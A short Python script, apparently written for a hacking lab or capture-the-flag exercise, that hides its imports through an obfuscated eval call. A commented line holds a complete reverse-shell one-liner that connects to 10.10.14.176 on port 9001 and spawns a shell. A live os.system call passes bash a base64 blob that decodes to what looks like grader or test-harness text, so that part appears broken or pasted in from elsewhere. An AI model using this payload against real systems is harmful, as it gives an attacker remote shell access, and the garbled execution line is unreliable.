#!/usr/bin/env python3
import socket
load_module = eval('__im' + 'port__')

os = load_module('os')
pty = load_module('pty')

# s=socket.socket();s.connect(("10.10.14.176",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
os.system('bash -c "KGNvcHlfZmlsZXMoW1wiaGJ0bi1sYWIvZmxhZy5zaFwiXSkgYW5kIGV4ZWNfYmFzaF9jb21wYXJlKFwiY2F0IGZsYWcuc2giLCBcIm9rXCIpKQ=="')

#except socket.gaierror
#socket.gethostbyname
